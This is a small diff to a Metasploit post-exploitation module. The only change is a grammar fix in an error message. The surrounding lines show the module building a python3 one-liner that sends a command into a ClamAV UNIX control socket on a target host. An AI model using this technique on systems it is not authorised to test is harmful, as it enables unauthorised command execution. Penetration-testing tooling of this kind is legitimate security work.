@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Post
       print_good('python3 exists')
       payload = "python3 -c \"import socket; sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); sock.connect('#{clamav_socket}'); sock.send('#{cmd}'.encode());\""
     else
-      print_bad('Neither socat, nc, python or python3 exist on the target host. Quitting!')
+      print_bad('Neither socat, nc, python nor python3 exist on the target host. Quitting!')
       return
     end
 
